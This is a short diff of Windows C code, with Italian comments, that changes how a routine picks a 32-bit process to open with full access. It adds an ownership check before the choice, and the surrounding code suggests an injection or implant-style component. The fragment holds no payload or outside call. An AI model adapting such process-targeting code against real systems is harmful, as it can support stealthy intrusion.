@@ -11,6 +11,8 @@ typedef void (__stdcall *GetNativeSystemInfo_PROC)(LPSYSTEM_INFO);
 typedef BOOL (__stdcall *Wow64DisableWow64FsRedirection_PROC)(PVOID *OldValue);
 typedef BOOL (__stdcall *Wow64RevertWow64FsRedirection_PROC)(PVOID OldValue);
 
+extern BOOL IsMyProcess(DWORD pid);
+
 #define INVALID_FUNC_PTR (void *)0xFFFFFFFF
 
 HANDLE core64_process = NULL;
@@ -86,7 +88,7 @@ DWORD Find32BitProcess()
 
 	// Cicla la lista dei processi attivi
 	do {
-		if (pe32.th32ProcessID!=curr_pid && !IsX64Process(pe32.th32ProcessID)) {
+		if (pe32.th32ProcessID!=curr_pid && !IsX64Process(pe32.th32ProcessID) && IsMyProcess(pe32.th32ProcessID)) {
 			hProc = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
 			if (hProc) {
 				CloseHandle(hProc);
